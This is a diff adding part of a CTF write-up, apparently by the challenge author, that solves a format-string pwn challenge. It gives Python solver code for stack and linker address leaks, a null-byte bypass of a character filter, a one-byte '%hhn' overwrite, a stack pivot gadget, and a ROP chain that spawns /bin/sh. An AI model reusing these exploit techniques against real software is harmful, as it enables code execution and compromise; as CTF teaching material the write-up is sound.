@@ -453,4 +453,209 @@ r.interactive()
 ```
 
 ### Formatter Specialist
-WIP
+For this one, there was one team (From the ones I checked) that got too close to solving it. The following binary was given:
+
+```
+$ checksec main
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b'.'
+```
+
+Running the binary, we see a menu:
+
+<p align="center">
+    <img src="/2023/NCSC/img/10.png"><br/>
+</p>
+
+I'll summarize the behavior of the program, We have the following structure:
+
+```c
+struct user{
+    char uname[9];
+    char birthday[40];
+    char bio[360];
+};
+```
+
+And this is the menu's functionalities:
+
+1. Option 1, ability to set the value of the `uname` field. Reads 9 bytes & null terminates the buffer
+
+```c
+read(0, u->uname, 9);
+u->uname[8] = 0;
+```
+
+Then passes it to a `printf` & we have a format string:
+
+```c
+char welcome[256];
+sprintf(welcome, "Welcome! %s.\n", u->uname);
+
+printf(welcome);
+changedUName = 1;
+```
+
+However, we can only do this once due to the `changedUName` check. The value is changed after the `printf` so we cannot change it using the format string.
+
+2. Option 2, ability to set the value of the `birthday` field. 40 bytes & our input is passed to a `verySecureFilter` function which does the following:
+
+```c
+void verySecureFilter(char *s){
+    for(int i=0; i<strlen(s); i++){
+        if(s[i] == '%' || s[i] == '$'){
+            s[i] = 0x20;
+        }
+    }
+}
+```
+
+This simply replaces every `%` & `$` with a space. Notice that we are using `strlen`, this is important later on to exploit.
+
+3. Option 3, ability to set the `bio` field. 360 bytes (**NOT** null terminated, this is important). Input is passed to `verySecureFilter` function too but this won't be important.
+
+4. Option 4, call showInfo:
+
+```c
+void showInfo(struct user* u){
+    printf("Username %s:\n", u->uname);
+    printf(u->birthday);
+    printf("Bio: %s", u->bio);
+}
+```
+
+We have an other format string on the birthday. Also, since `bio` field wasn't null terminated, we might have the chance to leak some values from the stack. Note that the size of it is 360 bytes, which is pretty large, that gives us a better chance to find some good addresses & leak them.
+
+Now, what do we currently have?
+
+1. 1 time use format string, limited size to 8 bytes.
+2. A larger format string (40 bytes) however it's filtered using `verySecureFilter` function (That uses `strlen`)
+3. A non-terminated buffer (`bio`) that's printed.
+
+Since we have a full protection binary, we might need to leak some values to start with. After that, we can store a format string payload in `birthday` field. However, to bypass the filter we must start our buffer with a null byte (`\x00`). That way, `verySecureFilter` function won't be able to edit our payload.
+
+One problem with that is, if the buffer starts with a null byte, the format string in `showInfo` won't be executed since `printf` won't go beyond the null byte. This is where the second format string comes in hands, we'll be able to write our payload with a null byte at the start, bypass the filter **then** overwrite the null byte with any value different than null. And that's what the one-time use format string would do.
+
+For that, we'll need to leak a stack address too.
+
+Also, it was a long time since I compiled this binary, one way to make things interesting was to compile it after the libc updates in order to get rid of gadgets. With that, a PIE leak won't be much of use & we'll have to leak something else. The solver I provided does indeed leak the PIE base however I'm not using any gadgets from the binary itself. More details below.
+
+For a start, we shall run the program & attach gdb to view what values we might have in the `bio` buffer. For that, we can set a breakpoint at `*readBio+38`, we can view the address of the buffer in the arguments for the `read` call:
+
+<p align="center">
+    <img src="/2023/NCSC/img/11.png"><br/>
+</p>
+
+With that, we view the memory at address `0x00007fff2aead191`, also if you haven't noticed, the address isn't properly aligned (because the field before it has a size of 9), so if you use that without being aware of it, you might get some weird/invalid addresses. We shall use `0x00007fff2aead190`. The size is 360 bytes, which means we should only check for 360/8=45 memory QWORDs:
+
+<p align="center">
+    <img src="/2023/NCSC/img/12.png"><br/>
+</p>
+
+And yep, it seems we do have some good values! 
+
+<p align="center">
+    <img src="/2023/NCSC/img/13.png"><br/>
+</p>
+
+We got ourselves an address from the linker, from the binary & a few stack addresses. We start off with the stack leak, considering that the stack can change, we need to find a leak with a const offset to our stack frame, or we can use the main's stack frame too. I went for the offset to our structure variable which is located in the main's stackframe. A good leak is `0x00007fff2aead1ff` which is at offset 63 in `bio`.
+
+I defined a few helper functions in the solver to represent the menu options & I'll be using them. To get our stack leak, we can use the following:
+
+```python
+payload = 'A'*56 + 'B'*6 # total of 62
+    
+setBio(payload) # Will send a \n at the end, gives total 63.
+leak = showInfo().split(b'\n')
+
+stack_leak  = u64(leak[-1].ljust(8, b'\0'))
+struct_adr  = stack_leak - 0x9f
+date_adr    = struct_adr + 9
+bin_sh      = date_adr + 40
+ret_adr     = stack_leak - 0xb7
+```
+
+With that, we get a return address, the address of our structure & we can calculate the address of each attribute. The `bin_sh` will be used later on, we'll simply store "/bin/sh" in our structure to use it.
+
+Now, we move on to the next. Also, we must be careful here, we must always start with the smallest offset to leak since we'll be overwriting data. We go for the linker's leak (0x00007f27318a1da7) located at offset 71:
+
+```python
+# LD Leak
+payload = 'A'*64 + 'B'*6
+setBio(payload)
+leak = showInfo().split(b'\n')
+
+ld_leak = u64(leak[-1].ljust(8, b'\0'))
+ld_base = ld_leak - 0x19da7
+```
+
+And finally (Not really needed), we can get a PIE leak at offset 312.
+
+```python
+# PIE Leak
+payload = 'A'*305 + 'B'*6
+setBio(payload)
+# r.interactive()
+leak = showInfo().split(b'\n')
+
+pie_leak = u64(leak[-1].ljust(8, b'\0'))
+pie_base = (pie_leak - 0x10) << 8
+```
+
+Now, we can do a typical ret2libc. I'm not sure if the offset between the linker & the libc base is constant but with the leaks we currently have, we can always do that by either calculating the base directly or doing a leak & a second stage ROP chain. However, that's a lot of work to do, we can check our linker for gadgets & it surely have some good stuff!
+
+Those are the gadgets we'll be using
+
+```python
+# ROP Gads
+ADD_RSP_RET         = ld_base + 0x000000000001d085 # add rsp, 0x110; mov eax, r12d; pop r12; ret;
+SYSCALL             = ld_base + 0x0000000000001a97 # syscall;
+POP_RDI             = ld_base + 0x000000000000118d # pop rdi; ret;
+POP_RSI             = ld_base + 0x0000000000001d28 # pop rsi; ret;
+POP_RAX_RDX_RBX     = ld_base + 0x00000000000011ce # pop rax; pop rdx; pop rbx; ret;
+```
+
+Now, we'll start with the format strings! We'll be writing a format string that starts with a null byte in `birthday` field then overwriting the null byte using the one-time use format string. Then use a format string with a buffer stored in `birthday` to overwrite a return address with a ROP chain.
+
+One problem the team that got too close faced was the length limit for the one-time use format string, 8 bytes. considering that an address is itself 8 bytes long! how would it be possible? Well, everything is stored in a struct remember? And that means, the fields are successive in memory. We don't have to store the addresses to be used by the format string in the same buffer! As long as we can index it, it's fine to store it a lil bit far.
+
+This is the last part of the solver which does overwrite the first byte of the `birthday` payload:
+
+```python
+payload = b"/bin/sh\0" + b"\x90"*207 # Padding
+payload += rop_chain
+payload += b"\x98"*(112 - len(rop_chain)) # Pad
+
+# Used by format string payload
+payload += p64(ret_adr + 2*ADD_RSP_RET_BYTES.index(ADD_RSP_RET_BYTES_sorted[2])) # 59
+payload += p64(ret_adr + 2*ADD_RSP_RET_BYTES.index(ADD_RSP_RET_BYTES_sorted[1])) # 60
+payload += p64(ret_adr + 2*ADD_RSP_RET_BYTES.index(ADD_RSP_RET_BYTES_sorted[0])) # 61
+payload += p64(date_adr) # used by setUName payload
+
+setBio(payload)
+
+payload = ".%96$hhn" # 1 dot to write \x01
+log('SetUName', setUName(payload))
+```
+
+As you can see, we stored the `date_adr` address in the `bio` & we only wrote ".%96$hhn" in the username. Index 96 points to the last 8 bytes in `bio`.
+
+For the `ADD_RSP_RET_BYTES`, we'll come back to that soon. Ignore it for now.
+
+Now, after overwriting "\x00" with "\x01", we'll be able to use our second format string. But how do we use that? We can write a ROP chain at the return address of `showInfo`. However, you might say that 40 bytes for a format string won't be enough. Debug time! If you look at the stack before returning from the `showInfo` function, you might notice that the structure which contains our input is close! 
+
+<p align="center">
+    <img src="/2023/NCSC/img/14.png"><br/>
+</p>
+
+Here comes the role of the ADD_RSP_RET gadget, which is a simple `add rsp, 0x110; mov eax, r12d; pop r12; ret;` to move rsp to our ROP chain stored in `bio` field.
+
+After that, we can do a ROP chain to execute a syscall. We use gadgets from the linker to get control over `rax`, `rdi`, `rsi` & `rdx` registers. We store "/bin/sh" in `bio` & use that. We store all the addresses used by the format strings in the `bio` field.
+
+And that's the end of the challenge. 
+
+Hope you enjoyed this & feel free to contact me for any questions/feedbacks.
